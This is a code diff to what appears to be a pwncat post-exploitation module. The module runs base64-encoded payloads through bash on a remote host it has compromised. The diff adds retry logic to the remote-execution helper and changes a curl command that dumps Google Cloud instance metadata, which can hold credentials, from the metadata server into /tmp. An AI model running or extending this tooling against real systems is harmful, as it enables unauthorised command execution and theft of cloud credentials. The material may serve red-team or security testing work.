@@ -5,6 +5,7 @@ from pwncat.modules import BaseModule, Argument
 from pwncat.manager import Session
 from pwncat.platform.linux import Linux
 from pathlib import Path
+import time
 import subprocess
 import shutil
 import tarfile
@@ -51,8 +52,36 @@ class Module(BaseModule):
                 session.log(f"Running payload: {encoded_payload}")
                 return run_remote(session, f"/bin/bash -c 'echo {encoded_payload} | tee \"{cwd}/{log_name}\" | base64 -d | /bin/bash'", cwd, timeout)
 
-            def run_remote(session, payload, cwd="/tmp", timeout=7200):
-                return session.platform.run(payload, cwd=cwd, timeout=timeout)
+            def run_remote(session, payload, cwd="/tmp", timeout=7200, retries=3, retry_delay=5):
+                attempt = 0
+                while attempt < retries:
+                    try:
+                        session.log(
+                            f"Running payload: {payload}, attempt {attempt + 1}")
+                        result = session.platform.run(
+                            payload, cwd=cwd, timeout=timeout)
+                        if result.returncode == 0:
+                            session.log("Payload executed successfully.")
+                            return result
+                        else:
+                            session.log(
+                                f"Payload execution failed with return code: {result.returncode}")
+                            session.log(f"Error output: {result.stderr}")
+                    except subprocess.TimeoutExpired:
+                        session.log(
+                            f"Timeout expired after {timeout} seconds for payload: {payload}")
+                    except subprocess.CalledProcessError as e:
+                        session.log(f"Subprocess error: {e}")
+                    except Exception as e:
+                        session.log(f"An unexpected error occurred: {e}")
+                    attempt += 1
+                    if attempt < retries:
+                        session.log(f"Retrying in {retry_delay} seconds...")
+                        time.sleep(retry_delay)
+
+                session.log(
+                    "All retries exhausted. Payload execution failed.")
+                return None
 
             def copy_file(session, source_file, dest_file, direction):
                 if direction == 'local_to_remote':
@@ -230,7 +259,7 @@ configure_container_identity
                     session.log(result)
                 elif csp == "gcp":
                     # get instance metadata
-                    payload = "curl \"http://metadata.google.internal/computeMetadata/v1/?recursive=true&alt=text\" -H \"Metadata-Flavor: Google\" > /tmp/instance_metadata.json"
+                    payload = "curl -s \"http://metadata.google.internal/computeMetadata/v1/?recursive=true&alt=text\" -H \"Metadata-Flavor: Google\" > /tmp/instance_metadata.json"
                     result = run_base64_payload(
                         session=session, payload=payload, log_name="payload_instancemetadata")
                     session.log(result)
